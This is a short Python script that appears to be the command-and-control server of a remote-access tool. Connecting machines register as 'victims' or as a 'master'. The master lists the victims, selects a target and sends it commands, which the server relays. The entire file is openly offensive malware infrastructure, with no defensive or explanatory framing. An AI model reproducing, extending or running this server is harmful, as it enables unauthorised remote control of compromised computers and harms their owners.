import socket
import threading

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 9999)) # or run on private ip

server.listen(5)

victemList = {}

def masterClientThread(client):
    currentTarget = ""

    while True:
        request = client.recv(1024).decode()

        if request == "" or request == " " or request == None:
            continue

        print(f"({addr[0]}) ISSUED: {request}")

        if request == "CLIST":
            client.send(str([key for key in victemList]).encode())

        if request.startswith("500:"):  # client is requesting a user
            print(f"getting user: {request.split('500:')[1]}")
            if request.split("500:")[1] in victemList.keys():
                currentTarget = request.split("500:")[1]

                client.send("501".encode())
            else:
                client.send("-501".encode())

        if request.startswith("555-"): # master client is sending a target command
            command = request.replace("555-","").split("~")[0]
            args = request.replace("555-","").split("~")[1]
            print(f"attempting to run command: ({command}) on target {currentTarget} with args: ({args})")

            victemList[currentTarget].send(request.encode())





while True:
    client, addr = server.accept()
    clientStatus = client.recv(1024).decode()
    isVictim = False
    myIdentifier = ""

    print(addr[0] + " is logged in with status: " + clientStatus)

    if clientStatus == "0": # is victim
        client.send("202".encode())

        myIdentifier = client.recv(1024).decode()

        print(addr[0] + " is: " + myIdentifier)

        victemList[myIdentifier] = client # add their name

        isVictim = True
    elif clientStatus == "1": # is master

        client.send("202".encode()) # confirmation

        threading.Thread(target=masterClientThread, args=[client]).start()
